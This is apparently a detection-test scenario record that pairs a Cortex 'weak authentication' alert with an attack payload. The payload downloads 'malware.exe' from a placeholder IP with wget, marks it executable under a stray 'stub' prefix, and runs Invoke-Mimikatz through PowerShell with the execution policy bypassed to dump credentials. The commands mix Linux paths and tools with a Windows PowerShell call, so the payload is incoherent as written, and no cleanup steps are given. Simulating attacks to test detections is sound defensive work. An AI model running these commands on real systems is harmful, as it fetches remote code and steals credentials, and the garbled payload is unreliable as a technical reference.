identity.name: Weak Authentication via PowerShell with Credential Dumping
identity.summary: An attacker uses PowerShell to perform weak authentication via credential dumping techniques, triggering the 'Unusual weak authentication by user' alert. This behavior is detected by Cortex analytics
identity.description: An attacker uses PowerShell to perform weak authentication via credential dumping techniques, triggering the 'Unusual weak authentication by user' alert. This behavior is detected by Cortex analytics when unusual authentication patterns occur.

payload.code:
wget http://192.0.2.10/malware.exe -O /tmp/credential_dumper.exe
stub chmod +x /tmp/credential_dumper.exe
powershell.exe -ExecutionPolicy Bypass -Command "Import-Module .\Invoke-Mimikatz.ps1; Invoke-Mimikatz -DumpCreds"

manual_steps: Not authored. Write and test cleanup before promotion.
